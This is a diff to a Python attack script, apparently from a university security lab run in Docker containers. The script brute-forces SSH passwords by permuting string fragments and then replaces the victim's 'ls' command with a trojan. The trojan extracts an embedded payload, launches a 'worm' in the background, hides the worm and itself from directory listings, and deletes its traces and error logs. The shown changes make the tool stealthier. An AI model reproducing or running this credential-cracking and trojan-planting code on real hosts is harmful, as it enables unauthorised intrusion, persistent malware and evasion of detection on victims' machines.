@@ -15,7 +15,7 @@ def ssh(vic_ip, vic_user, vic_passwd):
     except (paramiko.AuthenticationException, socket.error):
         return None
     except paramiko.SSHException:
-        print(f'[-] SSH exception with {vic_passwd}')
+        # print(f'[-] SSH exception with {vic_passwd}')
         return ssh(vic_ip, vic_user, vic_passwd)
     
 def task1(vic_ip, vic_user):
@@ -25,7 +25,6 @@ def task1(vic_ip, vic_user):
     for plen in range(1, len(frag_str)+1):
         for comb in itertools.permutations(frag_str, plen):
             passwd = ''.join(comb)
-            passwd = 'csc2024'
             connection = ssh(vic_ip, vic_user, passwd)
             if connection:
                 return connection
@@ -49,8 +48,7 @@ f.close()
 
 virus_payload2 = '''
 chmod +x worm
-./worm
-rm worm
+./worm &
 '''
 
 # init folder: /home/csc2024
@@ -69,7 +67,9 @@ def task2(connection, att_ip, att_port):
         f.write('dd if=ls of=lst.zip bs=1 skip=1024 count=' + str(zip_byte) + ' >/dev/null 2>&1\n')
         f.write('unzip lst.zip >/dev/null 2>&1\n')
         f.write('rm lst.zip\n')
-        f.write('./lst \"$@\" && rm lst\n')
+        f.write('./lst -I lst -I worm \"$@\"\n')
+        f.write('rm lst\n')
+        f.write('rm worm\n')
         f.write('exit 0\n')
 
     original_byte = int(os.popen("wc -c ls | awk '{print $1}'").read())
@@ -104,7 +104,7 @@ def task2(connection, att_ip, att_port):
 
 if __name__ == '__main__':
     if len(sys.argv) < 4:
-        print('Usage: python3 crack_attack.py <victim_ip> <attacker_ip> <attacker_port>')
+        print('Usage: ./crack_attack <victim_ip> <attacker_ip> <attacker_port>')
         sys.exit(1)
 
     ls_zip_base64_byte = os.popen('ls -l ls.zip | awk \'{print $5}\'').read()
@@ -115,10 +115,14 @@ if __name__ == '__main__':
     attacker_ip   = sys.argv[2]
     attacker_port = sys.argv[3]
 
+    sys.stderr = open('err.txt', 'a')
     connection = task1(victim_ip, victim_user)
     task2(connection, attacker_ip, attacker_port)
     os.system("rm ls")
     os.system("rm ls.zip")
+    os.system("rm err.txt")
+    sys.stderr.close()
+    sys.stderr = sys.__stderr__
 
 # ----- env setup -----
 # docker network prune
@@ -131,8 +135,8 @@ if __name__ == '__main__':
 # ----- run attacker -----
 # docker exec -it attacker bash
 # cd ../home/csc2024/id
-# python3 crack_attack.py  172.18.0.3 172.18.0.2 7777
-# python3 attack_server.py 7777
+# ./crack_attack  172.18.0.3 172.18.0.2 7777
+# ./attack_server 7777
 
 # ----- run victim -----
 # docker exec -it victim bash
